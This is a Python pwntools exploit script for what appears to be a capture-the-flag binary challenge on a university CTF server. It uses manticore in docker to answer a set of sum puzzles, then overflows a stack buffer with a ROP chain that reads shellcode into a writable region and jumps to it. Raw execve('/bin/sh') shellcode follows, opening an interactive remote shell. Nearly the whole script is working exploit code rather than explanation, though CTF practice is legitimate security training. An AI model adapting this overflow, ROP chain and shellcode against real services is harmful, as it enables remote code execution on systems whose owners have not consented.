#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import subprocess
import base64
import os
import time

context.arch = 'amd64'

def myexec(cmd):
    return subprocess.check_output(cmd, shell=True)

cur_dir = os.path.abspath(".")

r = remote("bamboofox.cs.nctu.edu.tw", 11017)
# save binary
log.success("saving binary...")
r.recvuntil("by base64\n")
resp = r.recvuntil("NOW")
resp = resp[:resp.index("NOW"):]
with open("tmp", "wb") as f:
    f.write(base64.b64decode(resp))

# remove manticore docker first
resp = myexec("docker ps -a")
if "manticore" in resp:
    os.system("docker rm -f manticore")

# run manticore docker background
start = time.time()
log.success("launching manticore docker at background...")
os.system("docker run -d -t --ulimit='stack=-1:-1' --name manticore -v {}:/home/manticore/work/ japesinator/manticore".format(cur_dir))
# run manticore to solve sums
log.success("running manticore script to solve sums...")
resp = myexec("docker exec manticore bash -c 'cd /home/manticore/work && ./win.py'")
# remove manticore container
os.system("docker rm -f manticore")
end = time.time()
log.success("total solving time: {} sec".format(str(end-start)))

# parse result
ans = resp.split("DILDO!!")[1].strip().split("\n")
assert len(ans) == 20

# start sending answers
r.recvuntil("like now!")
for c in ans:
    print r.recvline()
    p = str(c).ljust(4, "\x00")
    print "sending:", repr(p)
    r.send(p)

# get vuln buf's offset
resp = myexec("objdump -M intel -D ./tmp | grep \"400919\"").split("rbp-")[1].strip()[:-1:]
vuln_buf_off = int(resp, 16)
log.success("vuln_buf_off: "+hex(vuln_buf_off))

# craft rop chain + shellcode
buf = 0x00603000-0x100 # shellcode buffer
rop = ROP("./tmp")
rop.gets(buf)
rop.raw(buf) # rip = shellcode buffer after reading shellcode
print rop.dump()

payload = "A"*(vuln_buf_off+8) + str(rop)

# crap
r.sendlineafter("your sushi", "123")
# send rop chain
r.sendline(payload)
# send shellcode
r.sendline("\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05")

r.interactive()

